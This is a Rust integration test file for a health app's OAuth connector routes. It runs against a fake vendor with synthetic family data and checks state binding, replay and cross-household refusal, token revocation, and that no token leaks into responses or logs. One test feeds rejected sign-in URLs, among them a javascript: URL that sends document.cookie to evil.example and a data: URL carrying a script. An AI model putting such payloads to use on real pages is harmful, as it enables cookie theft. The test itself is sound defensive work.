//! v1.0 the connector routes (connectors.md 6.2) as a person uses them, against a fake vendor on
//! loopback: connect, see it, reconnect, disconnect; every callback that must not count (another
//! browser, another session, another person, a replay, an expired state, a refused consent); launches
//! for another household; and the revocation before a profile delete. No token ever comes back in an
//! answer, a redirect, the audit log or a log line. Synthetic data only (the Rivera family, LabNorte).

#[path = "auth_support.rs"]
mod support;

#[path = "../../ownhealth-core/tests/connector_fake/mod.rs"]
mod connector_fake;

use std::sync::{Arc, Mutex};

use axum::Extension;
use axum::http::StatusCode;
use connector_fake::{CLIENT_ID, CLIENT_SECRET, Fake, REDIRECT, param};
use ownhealth_api::routes::connectors::{EgressOverride, binder_cookie_name};
use ownhealth_core::Runtime;
use ownhealth_core::demo::create_rivera_family;
use ownhealth_core::net::Egress;
use ownhealth_core::secrets::{SecretBox, SecretString, store_secret};
use serde_json::{Value, json};
use support::{Client, Env, Resp};
use uuid::Uuid;

type R = anyhow::Result<()>;

/// 32 bytes of 0x09, base64.
const KEY: &str = "CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk=";

struct T {
    env: Env,
    fake: Fake,
    client: Uuid,
}

async fn env() -> anyhow::Result<Env> {
    let mut env = Env::new(true).await?;
    env.settings.secrets_key = Some(KEY.into());
    env.rt = Runtime::with_pool(env.settings.clone(), env.db.pool.clone())?;
    Ok(env)
}

async fn household(env: &Env, profile: Uuid) -> anyhow::Result<Uuid> {
    Ok(sqlx::query_scalar("select household_id from profile where id = $1")
        .bind(profile)
        .fetch_one(env.pool())
        .await?)
}

/// A confidential client of `household` at `fake`, as the wizard (slice 19) will leave it.
async fn client_at(env: &Env, household: Uuid, vendor: &str, fake: &Fake) -> anyhow::Result<Uuid> {
    let sb = SecretBox::from_settings(&env.settings)?;
    let mut c = env.pool().acquire().await?;
    let secret = store_secret(
        &mut c,
        &sb,
        household,
        "connector_client_secret",
        Some("Hospital LabNorte"),
        &SecretString::new(CLIENT_SECRET),
    )
    .await?;
    Ok(sqlx::query_scalar(
        "insert into connector_client (household_id, vendor, issuer, client_id, client_secret_id, redirect_uri) \
         values ($1, $2, $3, $4, $5, $6) returning id",
    )
    .bind(household)
    .bind(vendor)
    .bind(fake.issuer())
    .bind(CLIENT_ID)
    .bind(secret)
    .bind(REDIRECT)
    .fetch_one(&mut *c)
    .await?)
}

async fn setup() -> anyhow::Result<T> {
    let env = env().await?;
    let fake = Fake::start().await;
    let h = household(&env, env.profile("alex")).await?;
    let client = client_at(&env, h, "labnorte-ehr", &fake).await?;
    Ok(T { env, fake, client })
}

/// The fake is plain http on loopback: the routes may reach it only through this test extension.
fn widen(mut c: Client) -> Client {
    c.app = c.app.layer(Extension(EgressOverride(Egress {
        allow_private: true,
        https_only: false,
        ..Egress::connector()
    })));
    c
}

impl T {
    async fn browser(&self, slug: &str) -> anyhow::Result<Client> {
        Ok(widen(self.env.as_user(self.env.user(slug)).await?))
    }

    async fn launch(&self, c: &mut Client, profile: Uuid) -> anyhow::Result<Resp> {
        c.post(
            "/api/connectors/launch/smart",
            &json!({"profile_id": profile, "client_id": self.client}),
        )
        .await
    }

    /// The vendor's half: the person consents, and the browser comes back with a code.
    async fn callback(&self, c: &mut Client, authorize_url: &str) -> anyhow::Result<Resp> {
        let code = self.fake.consent(authorize_url);
        let state = param(authorize_url, "state").unwrap_or_default();
        c.get(&format!("/api/connectors/callback?state={state}&code={code}"))
            .await
    }

    async fn connect(&self, c: &mut Client, profile: Uuid) -> anyhow::Result<Uuid> {
        let r = self.launch(c, profile).await?;
        assert_eq!(r.status, StatusCode::OK, "{}", r.json);
        let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
        let back = self.callback(c, &url).await?;
        assert_eq!(back.status, StatusCode::FOUND, "{}", back.json);
        let loc = back.location();
        let id = loc.strip_prefix("/connections?connected=").unwrap_or_default();
        id.parse().map_err(|_| anyhow::anyhow!("not connected: {loc}"))
    }

    async fn count(&self, sql: &str) -> anyhow::Result<i64> {
        self.env.scalar_i64(sql).await
    }

    /// Every token the fake handed out, and the client secret.
    fn secrets(&self) -> Vec<String> {
        let mut out = self.fake.book().handed_out.clone();
        out.push(CLIENT_SECRET.into());
        out
    }

    fn assert_no_secret(&self, what: &str, text: &str) {
        for s in self.secrets() {
            assert!(!text.contains(&s), "{what} carries {s}: {text}");
        }
    }
}

fn error_of(r: &Resp) -> String {
    r.location()
        .strip_prefix("/connections?connector_error=")
        .unwrap_or("(no error)")
        .to_string()
}

#[tokio::test]
async fn a_person_connects_and_sees_the_connection_and_no_answer_carries_a_token() -> R {
    let t = setup().await?;
    let mut c = t.browser("alex").await?;
    let r = t.launch(&mut c, t.env.profile("alex")).await?;
    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let binder = binder_cookie_name(&param(&url, "state").unwrap_or_default());
    let cookie = r
        .set_cookies()
        .into_iter()
        .find(|s| s.starts_with(&format!("{binder}=")))
        .unwrap_or_default();
    assert!(
        cookie.contains("HttpOnly") && cookie.contains("Path=/api/connectors") && cookie.contains("Secure"),
        "{cookie}"
    );
    assert!(url.starts_with(&format!("{}/authorize?", t.fake.base)), "{url}");
    let back = t.callback(&mut c, &url).await?;
    assert_eq!(back.status, StatusCode::FOUND);
    let id: Uuid = back
        .location()
        .strip_prefix("/connections?connected=")
        .unwrap_or_default()
        .parse()?;
    // the binder goes once it is used
    assert!(
        back.set_cookies()
            .iter()
            .any(|s| s.starts_with(&format!("{binder}=")) && s.contains("Max-Age=0")),
        "{:?}",
        back.set_cookies()
    );
    // the Connections screen reads the health list
    let health = c.get("/api/inboxes/health").await?;
    let row = health
        .json
        .as_array()
        .and_then(|a| a.iter().find(|s| s["id"] == id.to_string().as_str()).cloned())
        .unwrap_or(Value::Null);
    assert_eq!(
        (row["kind"].as_str(), row["enabled"].as_bool()),
        (Some("smart"), Some(true)),
        "{}",
        health.json
    );
    let row: (Uuid, Option<Uuid>, bool) =
        sqlx::query_as("select profile_id, secret_id, reconsent_needed_at is null from source where id = $1")
            .bind(id)
            .fetch_one(t.env.pool())
            .await?;
    assert_eq!((row.0, row.1.is_some(), row.2), (t.env.profile("alex"), true, true));
    // no token anywhere a person or an agent reads
    for (what, text) in [
        ("launch", r.json.to_string()),
        ("callback", format!("{:?} {}", back.headers, back.json)),
        ("health", health.json.to_string()),
        ("inboxes", c.get("/api/inboxes").await?.json.to_string()),
        ("audit", c.get("/api/audit?limit=200").await?.json.to_string()),
    ] {
        t.assert_no_secret(what, &text);
    }
    let audited = t
        .count("select count(*) from audit_event where action = 'connector.connect' and tool = 'connectors'")
        .await?;
    assert_eq!(audited, 1);
    Ok(())
}

#[tokio::test]
async fn a_callback_counts_only_in_the_browser_and_the_session_that_started_it() -> R {
    let t = setup().await?;
    let alex = t.env.profile("alex");
    let mut a = t.browser("alex").await?;

    // the same person in another browser: no binder cookie
    let r = t.launch(&mut a, alex).await?;
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let mut other_browser = t.browser("alex").await?;
    let back = t.callback(&mut other_browser, &url).await?;
    assert_eq!(error_of(&back), "wrong_browser");
    // and the state is used up: the right browser cannot finish it now
    assert_eq!(error_of(&t.callback(&mut a, &url).await?), "state_invalid");

    // another person in the browser that started it (the binder came along)
    let r = t.launch(&mut a, alex).await?;
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let mut sam = t.browser("sam").await?;
    let name = binder_cookie_name(&param(&url, "state").unwrap_or_default());
    let binder = a.cookies.get(&name).cloned().unwrap_or_default();
    sam.cookies.insert(name, binder);
    assert_eq!(error_of(&t.callback(&mut sam, &url).await?), "wrong_user");

    // the same person, another session, with the binder
    let r = t.launch(&mut a, alex).await?;
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let mut later = t.browser("alex").await?;
    let name = binder_cookie_name(&param(&url, "state").unwrap_or_default());
    let binder = a.cookies.get(&name).cloned().unwrap_or_default();
    later.cookies.insert(name, binder);
    assert_eq!(error_of(&t.callback(&mut later, &url).await?), "wrong_user");

    // logged out
    let r = t.launch(&mut a, alex).await?;
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let mut anon = widen(t.env.anon());
    let name = binder_cookie_name(&param(&url, "state").unwrap_or_default());
    let binder = a.cookies.get(&name).cloned().unwrap_or_default();
    anon.cookies.insert(name, binder);
    assert_eq!(error_of(&t.callback(&mut anon, &url).await?), "wrong_user");

    // the person refused at the vendor: the state goes too
    let r = t.launch(&mut a, alex).await?;
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let state = param(&url, "state").unwrap_or_default();
    let refused = a
        .get(&format!("/api/connectors/callback?state={state}&error=access_denied"))
        .await?;
    assert_eq!(error_of(&refused), "denied");
    assert_eq!(error_of(&t.callback(&mut a, &url).await?), "state_invalid");

    // expired
    let r = t.launch(&mut a, alex).await?;
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    sqlx::query("update auth_challenge set expires_at = now() - interval '1 second' where purpose = 'connector' and used_at is null")
        .execute(t.env.pool())
        .await?;
    assert_eq!(error_of(&t.callback(&mut a, &url).await?), "state_invalid");

    // no state, a made-up state
    assert_eq!(
        error_of(&a.get("/api/connectors/callback?code=x").await?),
        "state_invalid"
    );
    assert_eq!(
        error_of(
            &a.get("/api/connectors/callback?state=made-up-state-of-some-length&code=x")
                .await?
        ),
        "state_invalid"
    );
    assert_eq!(t.count("select count(*) from source").await?, 0);
    assert_eq!(
        t.fake.book().auth_seen.len(),
        0,
        "a refused callback reached the vendor"
    );

    // the reverse: the right browser and session connect, once; the replay does not
    let r = t.launch(&mut a, alex).await?;
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let code = t.fake.consent(&url);
    let state = param(&url, "state").unwrap_or_default();
    let ok = a
        .get(&format!("/api/connectors/callback?state={state}&code={code}"))
        .await?;
    assert!(
        ok.location().starts_with("/connections?connected="),
        "{}",
        ok.location()
    );
    assert!(
        !a.cookies.contains_key(&binder_cookie_name(&state)),
        "the binder outlived its launch"
    );
    let replay = a
        .get(&format!("/api/connectors/callback?state={state}&code={code}"))
        .await?;
    assert_eq!(error_of(&replay), "state_invalid");
    assert_eq!(t.count("select count(*) from source").await?, 1);
    Ok(())
}

#[tokio::test]
async fn a_launch_for_another_household_or_a_profile_the_caller_does_not_manage_is_refused() -> R {
    let t = setup().await?;
    let ortega = {
        let mut c = t.env.pool().acquire().await?;
        create_rivera_family(&mut c, "Ortega").await?
    };
    let their_household = ortega.household_id;
    let their_fake = Fake::start().await;
    let their_client = client_at(&t.env, their_household, "labnorte-ehr", &their_fake).await?;
    let mut a = t.browser("alex").await?;
    // their profile, with our client
    let r = t.launch(&mut a, ortega.profile("lucia")).await?;
    assert!(matches!(r.status.as_u16(), 403 | 404), "{} {}", r.status, r.json);
    // our profile, with their client
    let r = a
        .post(
            "/api/connectors/launch/smart",
            &json!({"profile_id": t.env.profile("alex"), "client_id": their_client}),
        )
        .await?;
    assert_eq!(r.status, StatusCode::NOT_FOUND, "{}", r.json);
    // a profile Alex only cares for, and Sam on Alex's profile (a viewer)
    let r = t.launch(&mut a, t.env.profile("carmen")).await?;
    assert_eq!(r.status, StatusCode::FORBIDDEN, "{}", r.json);
    let mut sam = t.browser("sam").await?;
    let r = t.launch(&mut sam, t.env.profile("alex")).await?;
    assert_eq!(r.status, StatusCode::FORBIDDEN, "{}", r.json);
    // a kind no slice serves yet, and a kind that is not a connection
    for kind in ["bluebutton", "dexcom", "email", "nope"] {
        let r = a
            .post(
                &format!("/api/connectors/launch/{kind}"),
                &json!({"profile_id": t.env.profile("alex"), "client_id": t.client}),
            )
            .await?;
        assert_eq!(r.status, StatusCode::NOT_FOUND, "{kind}: {}", r.json);
    }
    // a client registered for one server cannot be pointed at another
    let r = a
        .post(
            "/api/connectors/launch/smart",
            &json!({"profile_id": t.env.profile("alex"), "client_id": t.client, "issuer": "https://fhir.otro.example/r4"}),
        )
        .await?;
    assert_eq!(r.status, StatusCode::UNPROCESSABLE_ENTITY, "{}", r.json);
    // the reverse: Alex launches for Lucía, whom Alex guards
    let r = t.launch(&mut a, t.env.profile("lucia")).await?;
    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
    assert_eq!(
        t.count("select count(*) from auth_challenge where purpose = 'connector'")
            .await?,
        1
    );
    // and the other household cannot finish or touch our connections
    let id = t.connect(&mut a, t.env.profile("alex")).await?;
    let mut theirs = widen(t.env.as_user(ortega.user("alex")).await?);
    for r in [
        theirs.post0(&format!("/api/connectors/{id}/reconnect")).await?,
        theirs.delete(&format!("/api/connectors/{id}")).await?,
    ] {
        assert_eq!(r.status, StatusCode::NOT_FOUND, "{}", r.json);
    }
    assert!(t.fake.book().revoked.is_empty());
    Ok(())
}

#[tokio::test]
async fn reconnect_clears_the_reconsent_flag_and_disconnect_revokes_and_removes_the_tokens() -> R {
    ownhealth_ingest_structured::register();
    let t = setup().await?;
    let mut a = t.browser("alex").await?;
    let id = t.connect(&mut a, t.env.profile("alex")).await?;
    // the first pull of the new connection is queued at once, not at the next scheduler pass
    let polls = format!(
        "select count(*) from job where kind = 'source.poll' and state = 'queued' and payload->>'source_id' = '{id}'"
    );
    assert_eq!(t.count(&polls).await?, 1, "the connect queued no pull");
    // the refresh was refused: the card says Out with the old failure until a run succeeds
    sqlx::query("delete from job where kind = 'source.poll'")
        .execute(t.env.pool())
        .await?;
    sqlx::query(
        "update source set reconsent_needed_at = now(), consecutive_failures = 1, last_error_at = now(), \
         last_error = 'JobError: reconsent_needed: the vendor no longer accepts this connection' where id = $1",
    )
    .bind(id)
    .execute(t.env.pool())
    .await?;
    let r = a.post0(&format!("/api/connectors/{id}/reconnect")).await?;
    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let back = t.callback(&mut a, &url).await?;
    assert_eq!(back.location(), format!("/connections?connected={id}"));
    let cleared: bool = sqlx::query_scalar("select reconsent_needed_at is null from source where id = $1")
        .bind(id)
        .fetch_one(t.env.pool())
        .await?;
    assert!(cleared, "reconnect left the reconsent flag");
    let failures: i32 = sqlx::query_scalar("select consecutive_failures from source where id = $1")
        .bind(id)
        .fetch_one(t.env.pool())
        .await?;
    assert_eq!(failures, 0, "the old grant's failures stay on the reconnected card");
    assert_eq!(t.count(&polls).await?, 1, "the reconnect queued no pull");
    assert_eq!(t.count("select count(*) from source").await?, 1);
    assert_eq!(
        t.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        1
    );
    // sealed under Alex's own key (version 2 names the profile), by the connect and the reconnect
    let head: Vec<u8> = sqlx::query_scalar(
        "select substring(ciphertext from 1 for 17) from secret where purpose = 'connector_refresh_token'",
    )
    .fetch_one(t.env.pool())
    .await?;
    assert_eq!((head[0], &head[1..]), (2, &t.env.profile("alex").as_bytes()[..]));
    // the token the reconnect stored: the newest refresh token the vendor handed out
    let held: String = {
        let book = t.fake.book();
        let newest = book.handed_out.iter().rev().find(|x| x.starts_with("fake-refresh"));
        newest.cloned().unwrap_or_default()
    };

    let r = a.delete(&format!("/api/connectors/{id}")).await?;
    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
    assert_eq!(r.json["revocation"], "revoked");
    t.assert_no_secret("disconnect", &r.json.to_string());
    assert!(
        t.fake.book().revoked.contains(&held),
        "the vendor was not asked to revoke"
    );
    assert_eq!(
        t.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        0
    );
    let row: (bool, Option<Uuid>, Option<Value>) =
        sqlx::query_as("select enabled, secret_id, cursor from source where id = $1")
            .bind(id)
            .fetch_one(t.env.pool())
            .await?;
    assert_eq!(row, (false, None, None));
    let audited: String = sqlx::query_scalar(
        "select args_summary from audit_event where action = 'connector.disconnect' order by id desc limit 1",
    )
    .fetch_one(t.env.pool())
    .await?;
    assert_eq!(audited, "revocation=revoked");
    // a failed revocation is said, and the tokens still go
    let id2 = t.connect(&mut a, t.env.profile("alex")).await?;
    t.fake.set(|b| b.fail_revoke = true);
    let r = a.delete(&format!("/api/connectors/{id2}")).await?;
    assert_eq!(
        (r.status, r.json["revocation"].as_str()),
        (StatusCode::OK, Some("failed")),
        "{}",
        r.json
    );
    assert_eq!(
        t.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        0
    );
    Ok(())
}

#[tokio::test]
async fn a_profile_delete_revokes_at_each_vendor_first_and_shows_a_failed_revocation() -> R {
    let t = setup().await?;
    let down = Fake::start().await;
    down.set(|b| b.fail_revoke = true);
    let h = household(&t.env, t.env.profile("lucia")).await?;
    let down_client = client_at(&t.env, h, "labsur-ehr", &down).await?;
    let mut a = t.browser("alex").await?;
    let up_id = t.connect(&mut a, t.env.profile("lucia")).await?;
    let held_up = t.fake.book().live.iter().next().cloned().unwrap_or_default();
    // the second connection's vendor is down
    let r = a
        .post(
            "/api/connectors/launch/smart",
            &json!({"profile_id": t.env.profile("lucia"), "client_id": down_client, "label": "Hospital LabSur"}),
        )
        .await?;
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let code = down.consent(&url);
    let state = param(&url, "state").unwrap_or_default();
    let back = a
        .get(&format!("/api/connectors/callback?state={state}&code={code}"))
        .await?;
    let down_id: Uuid = back
        .location()
        .strip_prefix("/connections?connected=")
        .unwrap_or_default()
        .parse()?;
    assert_eq!(
        t.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        2
    );

    let r = a.delete("/api/profiles/lucia?confirm=lucia").await?;
    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
    let outcomes: Vec<(String, String)> = r.json["connectors"]
        .as_array()
        .into_iter()
        .flatten()
        .map(|x| {
            (
                x["source_id"].as_str().unwrap_or_default().to_string(),
                x["outcome"].as_str().unwrap_or_default().to_string(),
            )
        })
        .collect();
    assert_eq!(
        outcomes,
        vec![
            (up_id.to_string(), "revoked".to_string()),
            (down_id.to_string(), "failed".to_string())
        ],
        "{}",
        r.json
    );
    assert!(t.fake.book().revoked.contains(&held_up));
    for x in r.json["connectors"].as_array().into_iter().flatten() {
        assert_eq!(x["label"].as_str().map(str::is_empty), Some(false), "{x}");
    }
    t.assert_no_secret("delete", &r.json.to_string());
    // the tokens go either way
    assert_eq!(
        t.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        0
    );
    assert_eq!(t.count("select count(*) from source where kind = 'smart'").await?, 0);
    let audited: Vec<(String, String)> = sqlx::query_as(
        "select args_summary, result_kind from audit_event where action = 'connector.revoke' order by id",
    )
    .fetch_all(t.env.pool())
    .await?;
    assert_eq!(
        audited,
        vec![
            ("revocation=revoked".to_string(), "ok".to_string()),
            ("revocation=failed".to_string(), "error".to_string())
        ]
    );
    Ok(())
}

#[tokio::test]
async fn two_launches_in_one_browser_both_complete_and_a_stray_callback_breaks_neither() -> R {
    let t = setup().await?;
    let mut a = t.browser("alex").await?;
    let (alex, lucia) = (t.env.profile("alex"), t.env.profile("lucia"));
    let url_of = |r: &Resp| r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    // a guardian connects two family members in two tabs
    let first = t.launch(&mut a, alex).await?;
    let second = t.launch(&mut a, lucia).await?;
    let (one, two) = (url_of(&first), url_of(&second));
    // a stale bookmark, or a vendor that sends the browser back twice
    let stray = a
        .get("/api/connectors/callback?state=made-up-state-of-some-length&code=x")
        .await?;
    assert_eq!(error_of(&stray), "state_invalid");
    let back = t.callback(&mut a, &one).await?;
    assert!(
        back.location().starts_with("/connections?connected="),
        "{}",
        back.location()
    );
    let back = t.callback(&mut a, &two).await?;
    assert!(
        back.location().starts_with("/connections?connected="),
        "{}",
        back.location()
    );
    // the other order
    let third = url_of(&t.launch(&mut a, alex).await?);
    let fourth = url_of(&t.launch(&mut a, lucia).await?);
    for url in [&fourth, &third] {
        let back = t.callback(&mut a, url).await?;
        assert!(
            back.location().starts_with("/connections?connected="),
            "{}",
            back.location()
        );
    }
    assert_eq!(t.count("select count(*) from source").await?, 4);
    // each launch has its own short-lived binder, and each goes with its launch
    let names: Vec<String> = [&one, &two]
        .iter()
        .map(|u| binder_cookie_name(&param(u, "state").unwrap_or_default()))
        .collect();
    assert_ne!(names[0], names[1]);
    for (r, name) in [(&first, &names[0]), (&second, &names[1])] {
        let set = r.set_cookies().into_iter().find(|c| c.starts_with(&format!("{name}=")));
        assert!(
            set.as_deref()
                .is_some_and(|c| c.contains("Max-Age=600") && c.contains("Path=/api/connectors/callback")),
            "{:?}",
            r.set_cookies()
        );
        assert!(!a.cookies.contains_key(name), "{name} outlived its launch");
    }
    Ok(())
}

/// A household client that has a secret: inserted as the wizard would, but with no fixed server.
async fn confidential_without_server(env: &Env, household: Uuid) -> anyhow::Result<Uuid> {
    let sb = SecretBox::from_settings(&env.settings)?;
    let mut c = env.pool().acquire().await?;
    let secret = store_secret(
        &mut c,
        &sb,
        household,
        "connector_client_secret",
        None,
        &SecretString::new(CLIENT_SECRET),
    )
    .await?;
    Ok(sqlx::query_scalar(
        "insert into connector_client (household_id, vendor, issuer, client_id, client_secret_id, redirect_uri) \
         values ($1, 'epic', null, $2, $3, $4) returning id",
    )
    .bind(household)
    .bind(CLIENT_ID)
    .bind(secret)
    .bind(REDIRECT)
    .fetch_one(&mut *c)
    .await?)
}

#[tokio::test]
async fn the_schema_refuses_a_client_with_a_secret_and_no_fixed_server() -> R {
    let t = setup().await?;
    let h = household(&t.env, t.env.profile("sam")).await?;
    match confidential_without_server(&t.env, h).await {
        Err(e) => assert!(e.to_string().contains("connector_client_secret_needs_issuer"), "{e}"),
        Ok(id) => panic!("a client with a secret and no server was stored: {id}"),
    }
    Ok(())
}

#[tokio::test]
async fn a_server_the_person_types_never_receives_the_household_client_secret() -> R {
    let t = setup().await?;
    let h = household(&t.env, t.env.profile("sam")).await?;
    // a row written before the schema refused it
    sqlx::query("alter table connector_client drop constraint if exists connector_client_secret_needs_issuer")
        .execute(t.env.pool())
        .await?;
    let client = confidential_without_server(&t.env, h).await?;
    let attacker = Fake::start().await;
    let mut sam = t.browser("sam").await?;
    let r = sam
        .post(
            "/api/connectors/launch/smart",
            &json!({"profile_id": t.env.profile("sam"), "client_id": client, "issuer": attacker.issuer()}),
        )
        .await?;
    assert_eq!(r.status, StatusCode::UNPROCESSABLE_ENTITY, "{}", r.json);
    assert!(r.json.get("authorize_url").is_none(), "{}", r.json);
    assert_eq!(attacker.book().requests, 0, "the typed server was reached");
    assert_eq!(
        t.count("select count(*) from auth_challenge where purpose = 'connector'")
            .await?,
        0
    );
    // the reverse: a public client (no secret) may serve whichever server the person names
    let public: Uuid = sqlx::query_scalar(
        "insert into connector_client (household_id, vendor, issuer, client_id, redirect_uri) \
         values ($1, 'meditech', null, $2, $3) returning id",
    )
    .bind(h)
    .bind(CLIENT_ID)
    .bind(REDIRECT)
    .fetch_one(t.env.pool())
    .await?;
    let r = sam
        .post(
            "/api/connectors/launch/smart",
            &json!({"profile_id": t.env.profile("sam"), "client_id": public, "issuer": attacker.issuer()}),
        )
        .await?;
    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
    Ok(())
}

#[tokio::test]
async fn a_server_that_names_a_script_as_its_sign_in_page_gets_no_redirect_handed_out() -> R {
    let t = setup().await?;
    let mut a = t.browser("alex").await?;
    let alex = t.env.profile("alex");
    let id = t.connect(&mut a, alex).await?;
    let launches = t
        .count("select count(*) from auth_challenge where purpose = 'connector'")
        .await?;
    for bad in [
        "javascript:fetch(\"https://evil.example/\"+document.cookie)//",
        "data:text/html,<script>alert(1)</script>",
        "http://login.evil.example/authorize",
    ] {
        t.fake.set(|b| b.authorize_url = Some(bad.into()));
        for r in [
            t.launch(&mut a, alex).await?,
            a.post0(&format!("/api/connectors/{id}/reconnect")).await?,
        ] {
            assert_eq!(
                (r.status, r.json["detail"]["code"].as_str()),
                (StatusCode::CONFLICT, Some("bad_endpoint")),
                "{bad}: {}",
                r.json
            );
            assert!(!r.json.to_string().contains("evil.example"), "{}", r.json);
            assert!(r.set_cookies().is_empty(), "{:?}", r.set_cookies());
        }
    }
    assert_eq!(
        t.count("select count(*) from auth_challenge where purpose = 'connector'")
            .await?,
        launches
    );
    Ok(())
}

#[tokio::test]
async fn a_callback_after_the_person_lost_the_right_to_manage_the_profile_saves_nothing() -> R {
    let t = setup().await?;
    let mut a = t.browser("alex").await?;
    let lucia = t.env.profile("lucia");
    let r = t.launch(&mut a, lucia).await?;
    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    // between the launch and the return, Alex is made a viewer of Lucía
    let changed = sqlx::query("update profile_grant set role = 'viewer' where user_id = $1 and profile_id = $2")
        .bind(t.env.user("alex"))
        .bind(lucia)
        .execute(t.env.pool())
        .await?
        .rows_affected();
    assert_eq!(changed, 1);
    let back = t.callback(&mut a, &url).await?;
    assert_eq!(error_of(&back), "forbidden");
    assert_eq!(t.count("select count(*) from source").await?, 0);
    assert!(t.fake.book().auth_seen.is_empty(), "the code went to the vendor");
    Ok(())
}

#[tokio::test]
async fn a_profile_delete_waits_at_most_the_cap_for_a_slow_revocation_and_says_it_failed() -> R {
    let t = setup().await?;
    let mut a = t.browser("alex").await?;
    t.connect(&mut a, t.env.profile("lucia")).await?;
    t.fake.set(|b| b.revoke_delay_ms = 8_000);
    let started = std::time::Instant::now();
    let r = a.delete("/api/profiles/lucia?confirm=lucia").await?;
    let took = started.elapsed();
    assert_eq!(r.status, StatusCode::OK, "{}", r.json);
    assert_eq!(r.json["connectors"][0]["outcome"], "failed", "{}", r.json);
    assert!(
        took < std::time::Duration::from_millis(7_000),
        "the delete waited {took:?}"
    );
    assert_eq!(
        t.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        0
    );
    Ok(())
}

/// A writer that keeps every log line of the test.
#[derive(Clone, Default)]
struct Captured(Arc<Mutex<Vec<u8>>>);

impl std::io::Write for Captured {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap_or_else(|e| e.into_inner()).extend_from_slice(buf);
        Ok(buf.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

#[tokio::test]
async fn no_log_line_carries_a_token_on_the_happy_or_the_failing_paths() -> R {
    let logs = Captured::default();
    let writer = logs.clone();
    let subscriber = tracing_subscriber::fmt()
        .with_max_level(tracing::Level::TRACE)
        .with_writer(move || writer.clone())
        .with_ansi(false)
        .finish();
    let _guard = tracing::subscriber::set_default(subscriber);
    let t = setup().await?;
    let mut a = t.browser("alex").await?;
    let id = t.connect(&mut a, t.env.profile("alex")).await?;
    // a code the vendor refuses
    let r = t.launch(&mut a, t.env.profile("alex")).await?;
    let url = r.json["authorize_url"].as_str().unwrap_or_default().to_string();
    let state = param(&url, "state").unwrap_or_default();
    let bad = a
        .get(&format!(
            "/api/connectors/callback?state={state}&code=fake-code-unknown"
        ))
        .await?;
    assert_eq!(error_of(&bad), "exchange_failed");
    // a revocation the vendor refuses
    t.fake.set(|b| b.fail_revoke = true);
    let r = a.delete(&format!("/api/connectors/{id}")).await?;
    assert_eq!(r.json["revocation"], "failed");
    let text = String::from_utf8_lossy(&logs.0.lock().unwrap_or_else(|e| e.into_inner())).to_string();
    assert!(text.contains("exchange failed"), "the capture saw nothing: {text}");
    assert!(text.contains("revocation"), "the capture missed the revocation: {text}");
    t.assert_no_secret("the log", &text);
    Ok(())
}
